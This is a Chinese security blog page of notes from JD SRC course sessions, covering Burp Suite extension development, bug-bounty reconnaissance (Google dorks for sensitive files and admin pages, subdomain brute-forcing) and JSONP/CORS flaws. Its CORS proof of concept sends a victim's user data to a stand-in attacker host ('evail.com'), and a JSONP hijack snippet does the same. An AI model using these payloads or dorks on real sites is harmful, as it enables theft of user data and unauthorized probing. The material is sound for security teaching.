@@ -1,0 +1,294 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>JDSRC安全课笔记 - 像清水一般清澈透明</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="清水Samny,"> 
+    <meta name="description" content="﻿# 第一期
+逻辑漏洞挖掘&amp;emsp;&amp;emsp; 逻辑漏洞中的认证缺失和认证缺陷漏洞，主要指功能级访问控制缺失，出现任意增删改查用户信息的情况。实际业务场景中，这类漏洞大概两个成因，上线前没有做好,"> 
+    <meta name="author" content="Samny"> 
+    <link rel="alternative" href="atom.xml" title="像清水一般清澈透明" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.1.1"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">像清水一般清澈透明</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">JDSRC安全课笔记</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">JDSRC安全课笔记</h1>
+        <div class="stuff">
+            <span>七月 20, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>﻿# 第一期</p>
+<h2 id="逻辑漏洞挖掘"><a href="#逻辑漏洞挖掘" class="headerlink" title="逻辑漏洞挖掘"></a>逻辑漏洞挖掘</h2><p>&emsp;&emsp; 逻辑漏洞中的认证缺失和认证缺陷漏洞，主要指功能级访问控制缺失，出现任意增删改查用户信息的情况。实际业务场景中，这类漏洞大概两个成因，上线前没有做好认证处理，或权限环节控制不到位。基于工具开发，我们可以通过域名信息收集、站点信息爬取、规则的分析与提取，以及批量处理结果分析与展示四个环节快速发现认证缺失漏洞和认证缺陷漏洞。</p>
+<h1 id="第二期"><a href="#第二期" class="headerlink" title="第二期"></a>第二期</h1><h2 id="基于-burpsuite的web逻辑漏洞插件开发"><a href="#基于-burpsuite的web逻辑漏洞插件开发" class="headerlink" title="基于 burpsuite的web逻辑漏洞插件开发"></a>基于 burpsuite的web逻辑漏洞插件开发</h2><p>Burp Suite作为web应用程序渗透测试集成平台,常被用来进行网站渗透测试。BurpSuite 提供了插件开发接口，支持Java、Python、Ruby语言的扩展。虽然 BApp Store 上面已经提供了很多插件，其中也不乏优秀好用的插件，（推荐几个个人感觉好的插件）CO2,Logger++,Autorize,XSS Validator。但是通用化的工具无法完全符合web安全测试人员的特定需求。</p>
+<p>1、为什么要独立开发插件<br>2、开发环境配置说明；<br>3、插件开发关键接口的使用实例；<br>4、逻辑漏洞检测插件开发探讨；</p>
+<p>1.为什么要独立开发插件<br>随着厂商安全意识增强，传输过程中，大多数线上业务通过https传输，传输流量加密。无法做中间人攻击了就，服务端，数据库中的敏感数据加密存储，访问控制受限，即使拿到数据库也无法拿到明文数据。但是数据在客户端最终要展示给用户，必然明文展现。传统的安全防御设备和措施对逻辑漏洞收效甚微，现在攻击者更倾向于在客户端利用此类漏洞。而逻辑漏洞种类很多，通用化的工具无法完全符合web安全测试人员的特定需求。一个业务的逻辑漏洞抽象出来的模型，难以在其他业务层进行批量处理，通用的解决方案往往效果不佳。但是一个业务层抽象出来的模型，在其自身站点往往具有通用性。例如，某URL存在越权，可能该站点其他URL也可能存在类似的问题。我们基于该URL特征，开发burpsuite插件，批量扫描该站点，就能更全面的发现同类问题。因此，我们有必要根据自己的业务需求，自己能够独立开发插件。</p>
+<p>2.开发环境配置<br>Burp支持Java、Python、Ruby语言的扩展，本次讲座以python环境为 例进行说明。Burpsuite 是运行在java环境，所有的库是java所写。Python作为开发语言，调用Java库就要用到Jython。</p>
+<p>以MacOS为 例子进行说明：<br>brew install jython，就可以了，Burpsuite Jython环境的配置：Extender -&gt; options -&gt; python Environment -&gt; select file,导入下载好的jython jar包。<img src="https://img-blog.csdnimg.cn/20200207154012356.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>3.：插件开发关键接口的使用实例，重点讲几个接口</p>
+<p>API接口查阅可以从以下拿到：<br>API接口文档可以在burpsuite 的Extender -&gt; APIs<br>也可以通过<a href="https://portswigger.net/burp/extender/api/index.html进行查阅。" target="_blank" rel="noopener">https://portswigger.net/burp/extender/api/index.html进行查阅。</a><br>IBurpExtender<br>IBurpExtender是Burpsuite插件的入口，所有插件的开发都必须要实现。<br>当插件被建立以后，registerExtenderCallbacks也需要实现。<br>代码如下：class BurpExtender(IBurpExtender):<br>def registerExtenderCallbacks(self, callbacks):<br>参数callbacks可获取核心基础库,例如日志，请求，返回值修改等。<br>IExtensionHelpers:<br>提供了编写扩展中常用的一些通用函数，比如编解码、构造请求、获取请求参数，获取请求头等。如：IRequestInfo analyzeRequest(byte[] request)<br>通过analyzeRequest函数，可以拿到请求的细节。<br>通过如下几个接口方法可以拿到。<br><img src="https://img-blog.csdnimg.cn/20200207154237626.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>IHttpRequestResponse: 这个接口包含了每个请求和响应的细节。在Brupsuite中的每个请求或者响应都是IHttpRequestResponse实例。通过getRequest()， getResponse()方法可以获取请求和响应的细节信息。</p>
+<p>以registerHttpListener为例进行代码说明：</p>
+<p><img src="https://img-blog.csdnimg.cn/2020020715432066.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如图所示，在user 和 webserver之间建立监听，调用HttpListener接口。获取请求，响应的日志。<br>实现这个功能，最重要的是这个方法：    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">register ourselves as an HTTP listener callbacks.registerHttpListener(self)</span><br><span class="line">    def registerExtenderCallbacks(self, callbacks):</span><br><span class="line">        self._callbacks &#x3D; callbacks</span><br><span class="line">        self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line">        ## 设置插件名</span><br><span class="line">        self._callbacks.setExtensionName(&quot;getTheRequest&quot;)</span><br></pre></td></tr></table></figure>
+<pre><code> # //如果没有注册，下面的processHttpMessage方法是不会生效的。处理请求和响应包的插件，这个应该是必要的
+
+   callbacks.registerHttpListener(self)
+### processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)，
+### 在messageInfo这个参数中，我们可以获取到request和response日志。</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">processHttpMessage</span><span class="params">(self, toolFlag, messageIsRequest, messageInfo)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> toolFlag == <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> messageIsRequest:</span><br><span class="line">                request = messageInfo.getRequest()</span><br><span class="line">                analyzedRequest = self._helpers.analyzeResponse(request)</span><br><span class="line">                request_header = analyzedRequest.getHeaders()</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    method, path = res_path.findall(request_header[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    host = res_host.findall(request_header[<span class="number">1</span>])[<span class="number">0</span>]</span><br><span class="line">                    url = method + <span class="string">" "</span> + host + path</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    url = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> method == <span class="string">"GET"</span>:</span><br><span class="line">                    <span class="keyword">print</span> “[+++++]The URL <span class="keyword">is</span> <span class="string">", url</span></span><br><span class="line"><span class="string">                    print "</span>[+++++]The host <span class="keyword">is</span> <span class="string">",host</span></span><br><span class="line"><span class="string">                    print "</span>[++++] The URI <span class="keyword">is</span> following<span class="string">"</span></span><br><span class="line"><span class="string">                    print path</span></span><br><span class="line"><span class="string">                    for iterm in path.split("</span>/<span class="string">"):</span></span><br><span class="line"><span class="string">                        print iterm</span></span><br><span class="line"><span class="string">                    print "</span>======================================================================================<span class="string">"</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>
+<p><code>代码如上所示，就可以打印出URL，HOST，URI日志信息</code><br><img src="https://img-blog.csdnimg.cn/20200207154729683.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是一个demo。延伸一下，我们在做渗透测试的过程中，往往苦于目录字典不全，我们将这个URI生成目录字典，为目录爆破做准备。</p>
+<hr>
+<p>如果做扫描类插件：<br>class BurpExtender(IBurpExtender,IScannerCheck)<br>callbacks.registerScannerCheck(this);<br>实现IScannerCheck后需要重写被动扫描的函数。<br>doPassiveScan(IHttpRequestResponse baseRequestResponse) {}<br>doPassiveScan这个接口，在baseRequestResponse获取请求和响应数据，并利用这些数据进行基于扫描规则进行扫描。</p>
+<h1 id="第四期-SRC挖掘"><a href="#第四期-SRC挖掘" class="headerlink" title="第四期 SRC挖掘"></a>第四期 SRC挖掘</h1><p>首先将公司架构吧，我们就以京东为例吧</p>
+<p>企业的组织架构信息可通过开源信息获取。<br>常用的方法，通过维基百科，百度百科等确定企业的大体组织架构；<br>zh.wikipedia.org<br>baike.baidu.com</p>
+<p><img src="https://img-blog.csdnimg.cn/20200306154856499.jpg" alt="在这里插入图片描述">结合以下站点信息，进一步确定企业组织架构：<br>国家企业信用公示系统：<a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a><br>天眼查：<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a></p>
+<p>公司架构确定完成后，我们开始被动信息的收集</p>
+<p>被动信息收集是指不与目标直接交互，通过公开的渠道获取获取目标信息。<br>可从以下几点展开，DNS信息收集，https证书信息，搜索引擎，网络空间安全搜索引擎，基于备案资料信息收集。</p>
+<p>DNS信息收集<br>通过目标站点的域名注册信息，如whois日志进行信息关联。</p>
+<p>国外常用的whois查询站点：<br><a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a><br><a href="https://whois.cymru.com/cgi-bin/whois.cgi" target="_blank" rel="noopener">https://whois.cymru.com/cgi-bin/whois.cgi</a><br><a href="https://whois.arin.net/ui/query.do" target="_blank" rel="noopener">https://whois.arin.net/ui/query.do</a></p>
+<p>国内常用的whois查询站点：<br>[图片]<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a><br><a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a></p>
+<p>通过whois查询确定注册者，然后关联同一注册者的其他站点信息。</p>
+<p><a href="https://viewdns.info/reversewhois/?q=email@111.com" target="_blank" rel="noopener">https://viewdns.info/reversewhois/?q=email@111.com</a><br><a href="https://whois.chinaz.com/reverse?ddlSearchMode=2" target="_blank" rel="noopener">https://whois.chinaz.com/reverse?ddlSearchMode=2</a></p>
+<p>https证书信息，即通过https证书进行信息收集，可通过采用以下几种方式</p>
+<p>基于证书透明度两个站点：<br><a href="https://certspotter.com/api/v0/certs" target="_blank" rel="noopener">https://certspotter.com/api/v0/certs</a><br><a href="https://crt.sh" target="_blank" rel="noopener">https://crt.sh</a></p>
+<p>为方便信息处理，可编写脚本处理：<br>crtFetch -d example.com</p>
+<p><img src="https://img-blog.csdnimg.cn/2020030615473366.jpg" alt="在这里插入图片描述"><br>我们看到就可以梳理出一部分子域名信息了<br>脚本位置：<a href="https://github.com/3stoneBrother/personalTools/blob/master/scripts/crtFetch.py" target="_blank" rel="noopener">https://github.com/3stoneBrother/personalTools/blob/master/scripts/crtFetch.py</a></p>
+<p>该脚本对在线站点获取的域名进行清洗，可获取到单域名SSL证书和通配符SSL证书两类。</p>
+<p>有时候我们可能忽略的地方，有些企业的https证书中的相关域名可在浏览器证书中点击查看；</p>
+<p><img src="https://img-blog.csdnimg.cn/20200306154605875.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200306154625356.jpg" alt="在这里插入图片描述"></p>
+<p>基于goolge hack技术可以查询到很多敏感信息。<br>更详细的用法可在这里查询：<br><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></p>
+<p>我们常用关键字查询：<br>site：搜索域名的范围<br>inurl：URL格式<br>intitle：搜索的网页标题<br>intext：搜索包含其中文字的网页<br>filetype：搜索文件的后缀或者扩展名<br>cache：搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息<br>link：搜索某个网站的链接<br>info：查找指定站点的一些基本信息</p>
+<h2 id="【查找敏感文件】"><a href="#【查找敏感文件】" class="headerlink" title="【查找敏感文件】"></a>【查找敏感文件】</h2><p>site:xxx.com (filetype:doc OR filetype:ppt OR filetype:pps OR filetype:xls OR filetype:docx OR filetype:pptx OR filetype:ppsx OR filetype:xlsx OR filetype:odt OR filetype:ods OR filetype:odg OR filetype:odp OR filetype:pdf OR filetype:wpd OR filetype:svg OR filetype:svgz OR filetype:indd OR filetype:rdp OR filetype:sql OR filetype:xml OR filetype:db OR filetype:mdb OR filetype:sqlite)</p>
+<h2 id="【查找敏感目录地址】"><a href="#【查找敏感目录地址】" class="headerlink" title="【查找敏感目录地址】"></a>【查找敏感目录地址】</h2><p>site:xxx.com inurl:login|admin|manage|admin_login|system|user|auth|dev|test<br>site:xxx.com intitle:后台|管理|内部|登录|系统</p>
+<p>以下可能是我们会忽略的几个关键字查询语句：</p>
+<h3 id="基于备案号，copyright信息查询"><a href="#基于备案号，copyright信息查询" class="headerlink" title="基于备案号，copyright信息查询"></a>基于备案号，copyright信息查询</h3><p>intext:”Tesla © 2020”<br>intext:”京ICP备11041704号-15”</p>
+<h2 id="可以正则的形式"><a href="#可以正则的形式" class="headerlink" title="可以正则的形式"></a>可以正则的形式</h2><p>site:dev.<em>.</em>/signin<br>site:<em>/recover-pass<br>site:smtp.</em>.<em>/login<br>site:/com:</em><br>site:/216.75.<em>.</em></p>
+<p>##基于端口或者端口范围查询<br>site:/com:8443/<br>site:/com:* 8000…9000</p>
+<p>查询到的关键词，利用备案信息可以大致确定各个站点的域名信息。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200306155039691.jpg" alt="在这里插入图片描述"><br>curl <a href="http://www.beianbeian.com/search-1/example.html" target="_blank" rel="noopener">http://www.beianbeian.com/search-1/example.html</a> | grep “<br>“ |  grep -o “www.\w<em>.\w</em>“ | sort | uniq |sed “s/www.//g”</p>
+<p><img src="https://img-blog.csdnimg.cn/20200306155121441.png" alt="在这里插入图片描述"></p>
+<p>不断的根据网络备案/许可证号进行反查，即可梳理更多的资产信息。<br>确定企业的IP段，可基于<a href="https://bgp.he.net/站点进行收集。" target="_blank" rel="noopener">https://bgp.he.net/站点进行收集。</a><br>输入公司名称可查询该公司的IP资产信息，然后正则匹配IP段：<br>cat aa.txt| grep -Eo “&lt;td&gt;.<em>?td&gt;“| grep “href”| grep -Eo “([0-9]{1,3}[.]){3}[0-9]{1,3}/</em>[0-9]{0,2}”</p>
+<h2 id="微信公共号"><a href="#微信公共号" class="headerlink" title="微信公共号"></a>微信公共号</h2><p>基于公众号信息，我们可以挖掘到很多的厂商业务信息。公司的公众号信息可在sogou搜索引擎可以进行查询。<br><a href="https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E4%BA%AC%E4%B8%9C" target="_blank" rel="noopener">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E4%BA%AC%E4%B8%9C</a><br>为便于快速梳理，可用脚本处理。<br>python gongzhonghao.py -d “目标公司”<br><a href="https://github.com/3stoneBrother/personalTools/blob/master/scripts/gongzhonghao.py" target="_blank" rel="noopener">https://github.com/3stoneBrother/personalTools/blob/master/scripts/gongzhonghao.py</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20200306155403699.jpg" alt="在这里插入图片描述"><br>这就得到某公司的所有公众号信息</p>
+<h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><p>通过被动信息收集到一批域名，IP信息。以主动信息比较容易忽略的三级域名，甚至四级域名为例进行说明。通配符SSL证书往往是三级、四级域名高效爆破的目标，为批量处理，在crtFetch脚本中提取了需要进一步爆破的三级、四级域名。</p>
+<p>然后进行域名爆破，爆破工具有很多，以gobuster为例进行演示：<br>gobuster dns -t 30 -w  sub_name.txt -i  -q –wildcard -d api.example.com| tee  domains-active.txt</p>
+<p><img src="https://img-blog.csdnimg.cn/20200306155621157.png" alt="在这里插入图片描述"><br>这些三级四级域名，防护往往会薄弱一些</p>
+<p>域名是否存活可利用httprobe工具确定。<br>cat domain.txt | httprobe &gt; domain-alive.txt </p>
+<p><img src="https://img-blog.csdnimg.cn/20200306155753708.png" alt="在这里插入图片描述"><br>也可通过whatweb查看链接的服务器版本，标题等信息，处理结果如下图所示<br><img src="https://img-blog.csdnimg.cn/20200306155835844.png" alt="在这里插入图片描述"><br>为便于批量查看URL内容，我们可通过屏幕截图工具webscreenshot进行处理。<br>具体方法如下：首先将存活的站点截图到screenshots文件夹下面：<br>webscreenshot -i alive.txt -o screenshots -w 20 -m -a “X-FORWARDED-FOR:127.0.0.1”<br>为便于浏览，我们将截图生成一个html文件便于在浏览器查看：<br>for I in $(ls -S); do echo “$I” &gt;&gt; index.html；echo “&lt;\ img src=$I&gt;&lt;br&gt;” &gt;&gt; index.html； done<br>在浏览器中打开 index.html文件，就可看到所有的网页截图了。效果如下图，所有存活站点都在一个页面展现出来。可根据站点内容做进一步的渗透测试。</p>
+<hr>
+<h1 id="第五期"><a href="#第五期" class="headerlink" title="第五期"></a>第五期</h1><p>&emsp;&emsp; 在企业级应用开发中，经常会遇到跨域数据交互的问题，例如多个子集应用之间通过跨域获取用户登录状态及身份信息等，从而能够满足现代web应用中的实际需求。因此谈到跨域就要了解下浏览器的同源策略。<br>&emsp;&emsp; 浏览器的同源策略（Same Origin Policy,SOP）,同源要求两个页面具有相同的协议、域名、端口号。当A应用(<a href="https://www.a.com)想请求B应用(https://www.b.com)里面的某个接口" target="_blank" rel="noopener">https://www.a.com)想请求B应用(https://www.b.com)里面的某个接口</a>(提交操作）或者读取接口返回的数据作进一步的处理的话，这时就需要考虑跨域问题了，一般情况下浏览器会阻止这种不安全的跨域行为。但在html语言中，有些标签是具备天然的跨域功能的，比如&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;等标签是可以直接跨域请求其它域的资源的，这就催生了JSONP(JSON with Padding)，JSONP本质上是利用了&lt;script&gt;标签的跨域能力。</p>
+<h2 id="JSONP跨域安全开发实践方面"><a href="#JSONP跨域安全开发实践方面" class="headerlink" title="JSONP跨域安全开发实践方面"></a>JSONP跨域安全开发实践方面</h2><p>a.com 想要跨域读取b.com下的/getinfo的返回数据，a.com前端示例代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp_callback</span><span class="params">(msg)</span></span>&#123;      </span><br><span class="line"> <span class="keyword">do</span> something();<span class="comment">//回调函数，自定义读取数据后续操作    </span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src =<span class="string">"http://b.com/getinfo?callback=jsonp_callback"</span> type=<span class="string">"text/javascript"</span> &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>b.com后台示例代码如下 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value=<span class="string">"/getinfo"</span>,method=RequestMethod.GET)</span><br><span class="line">@ResponseBody</span><br><span class="line"><span class="keyword">public</span> String getToken(@RequestParam(<span class="string">"callback"</span>) String callbackFunction)&#123;  </span><br><span class="line"><span class="keyword">return</span> callbackFunction+<span class="string">"&#123;\"result\":&#123;\"data\":&#123;\"token\":\"18623163885dedec5decbab1.37745340\"&#125;&#125;&#125;;"</span>;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>则此时 而此时b.com 响应报文返回的json数据为：jsonp_callback({“result”:{“data”:{“token”:”18623163885dedec5decbab1.37745340”}}});然后a.com能够获取返回的数据</p>
+<hr>
+<h2 id="jsonp开发实践中经常会出现的一些问题"><a href="#jsonp开发实践中经常会出现的一些问题" class="headerlink" title="jsonp开发实践中经常会出现的一些问题"></a>jsonp开发实践中经常会出现的一些问题</h2><ol>
+<li><p>未正确设置响应报文头Content-Type 而导致的反射型XSS一般来说，默认的响应报文头<code>Content-Type:text/html</code>，则此时容易产生反射型xss，从而进一步获取数据。因此我们可通过设置Content-Type为<code>application/json</code>指明返回的报文体是json格式的，避免浏览器解析执行。这个主要是后端是根据前面传入的callback参数的，因此可能导致反射型xss 。</p>
+</li>
+<li><p>JSONP劫持：有些web应用，尤其是同域名下的不同子域之间，通过JSONP方式传输敏感信息，例如用户信息、支付信息、鉴权token等，就要关注JSONP劫持问题了。</p>
+</li>
+</ol>
+<p>一个简单的劫持的代码片段，对于这种jsonp劫持问题，一般企业是对返回的数据做了脱敏处理。尤其对于 姓名 身份证号 手机号 银行卡号之类的个人敏感信息一般只保留其中的几个字符，其他用*号代替。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="function"><span class="keyword">function</span> <span class="title">jsonp_callback</span>(<span class="params">msg</span>)</span>&#123;      </span><br><span class="line">   <span class="comment">//alert(msg);        </span></span><br><span class="line">   do_evilSomething();<span class="comment">//发送敏感数据  &#125;</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src =http:/</span><span class="regexp">/b.com/g</span>etinfo?callback=jsonp_callback type=<span class="string">"text/javascript"</span> &gt; <span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>不得不提到，JSONP跨域数据传输只能通过GET方式，下面再介绍另外一种跨域方法—CORS。</p>
+<hr>
+<h2 id="cors"><a href="#cors" class="headerlink" title="cors"></a>cors</h2><p>&emsp;&emsp; 我们常说的跨域资源共享(CORS) 是一种机制，它使用额外的 HTTP 头来告诉浏览器让运行在一个 origin (domain) 上的Web应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器不同的域、协议或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。但是浏览器决定是否阻断此次请求是要看被跨域请求的网站（b.com）的返回头header中是否包含“授权访问标头”—Access-Control-Allow-Origin。</p>
+<p>一个cors请求代码示例：</p>
+<p><img src="https://img-blog.csdnimg.cn/20200515155329679.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200515155343926.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 响应中响应首部字段 Access-Control-Allow-Origin: * 表明，该资源可以被任意外域访问。如果服务端仅允许来自 <a href="http://foo.example" target="_blank" rel="noopener">http://foo.example</a> 的访问，该首部字段的内容如下：Access-Control-Allow-Origin: <a href="http://foo.example" target="_blank" rel="noopener">http://foo.example</a> 。</p>
+<p>&emsp;&emsp; 当然这次请求会成功，但是当我们把上面的代码片段中:<br>xmlhttp.setRequestHeader(“Content-Type”,”application/json”);<br>我们会发现浏览器会多一步操作就是先发送一个 OPTIONS方法请求，通常也称为预请求。火狐等浏览器规定是以下情况的请求需要先进行“预检”。<br>&emsp;&emsp; 当请求满足下述任一条件时，即应首先发送预检请求：<br>Content-Type 的值不属于下列之一:</p>
+<blockquote>
+<p>application/x-www-form-urlencoded<br>multipart/form-data<br>text/plain</p>
+</blockquote>
+<p>&emsp;&emsp; 使用了下面任一 HTTP 方法：<code>PUT DELETE CONNECT OPTIONS TRACE PATCH</code>，还有人为设置了对 CORS 安全的首部字段集合之外的其他首部字段等。如果需要跨域请求带上被请求域的Cookie，则需要响应中响应首部字段：<code>Access-Control-Allow-Credentials: true</code> ，但同时浏览器为了安全起见，同时和<code>Access-Control-Allow-Origin: *</code>使用请求会被直接阻断。</p>
+<h2 id="CORS中开发误配置所导致的安全问题："><a href="#CORS中开发误配置所导致的安全问题：" class="headerlink" title="CORS中开发误配置所导致的安全问题："></a>CORS中开发误配置所导致的安全问题：</h2><p>（1）Access-Control-Allow-Origin 误配置获取敏感数据<br>一般有些应用确实不允许跨域，但若web中间件（例如nginx）上被误配置（尤其和其它应用使用同一个nginx做反向代理【add_header ‘Access-Control-Allow-Origin’ $origin;】）就会造成本级应用被强制允许跨域。<br>(2）本级应用允许跨域，但编写正则可绕过<br>(3)    绕过预检请求的写操作CSRF<br>&emsp;&emsp; 假如应用A与应用B的某个接口之间(数据传输使用json格式)存在跨域资源共享，但应用B未校验Content-Type，因此可通过XMLHttpRequest设置<code>Content-Type为&quot;text/plain&quot;</code>绕过预检请求<br>&emsp;&emsp; 携带cookie发送请求报文到B的服务端。（若浏览器发现B返回的报文头没有<code>Access-Control-Allow-Origin</code>和<code>Access-Control-Allow-Credentials: true</code>字段，则不允许读取返回的数据）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonreq</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"https://www.b.com/getuserinfo"</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"text/plain"</span>);<span class="comment">//注意这里</span></span><br><span class="line">xmlhttp.send(<span class="literal">null</span>);</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line"><span class="keyword">var</span> res= xhr.responseText; <span class="comment">// 读取返回的数据 </span></span><br><span class="line">location=<span class="string">'http://evail.com?param='</span>+res; </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">jsonreq();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
+<hr>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
